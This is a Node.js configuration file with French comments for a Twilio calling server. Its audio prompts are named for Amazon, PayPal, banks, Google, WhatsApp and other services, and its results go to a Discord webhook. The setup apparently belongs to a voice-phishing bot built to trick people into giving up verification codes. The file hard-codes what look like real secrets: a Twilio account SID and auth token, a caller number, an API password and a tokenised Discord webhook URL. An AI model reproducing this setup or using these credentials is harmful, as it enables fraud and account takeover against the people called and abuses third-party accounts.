module.exports = {
    setupdone: 'false',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'AC3ee6ad7181ab76400a333a86704deade',
    authToken: 'b6fff4fe01df1e6159116ba83e406801',
    callerid: '+17409000920',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'spider',
    serverurl: 'http://yourserverip:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/987279054501740555/j28hGn0xQzxJNbzY3x7yHItrbtTH3x3S165f1U38x5sAFdQTHex2xxObWGH1kUIg3BX-',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
